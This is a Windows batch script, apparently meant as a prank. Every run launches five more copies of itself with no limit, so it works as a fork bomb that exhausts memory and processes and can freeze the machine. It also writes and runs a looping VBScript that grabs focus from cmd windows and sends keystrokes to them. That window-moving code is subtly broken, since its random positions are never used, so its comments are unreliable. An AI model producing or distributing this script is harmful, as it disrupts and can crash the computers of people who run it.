batch
@echo off
setlocal enabledelayedexpansion

:: Set the number of duplicates to create
set count=5

:: Create a temporary VBS file for moving windows
set "vbsFile=move.vbs"

:: Create the VBS script to move the command prompt windows
(
    echo Set objShell = CreateObject("WScript.Shell")
    echo Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    echo Do
    echo     Set colItems = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'cmd.exe'")
    echo     For Each objItem in colItems
    echo         x = Int(Rnd * 800) ' Random x position (0-800)
    echo         y = Int(Rnd * 600) ' Random y position (0-600)
    echo         objShell.AppActivate objItem.ProcessId
    echo         WScript.Sleep 100
    echo         objShell.SendKeys "% {DOWN}" ' Simulates Alt + Down to move the window
    echo         WScript.Sleep 100
    echo         objShell.SendKeys "% {UP}" ' Simulates Alt + Up to move the window
    echo     Next
    echo     WScript.Sleep 500
    echo Loop
) > "%vbsFile%"

:: Duplicate the batch file itself
for /L %%i in (1,1,%count%) do (
    start "" "%~f0"
)

:: Run the VBS script
start "" wscript "%vbsFile%"

:: Clean up the VBS file after 10 seconds
timeout /t 10 > nul
del "%vbsFile%"

endlocal
exit /b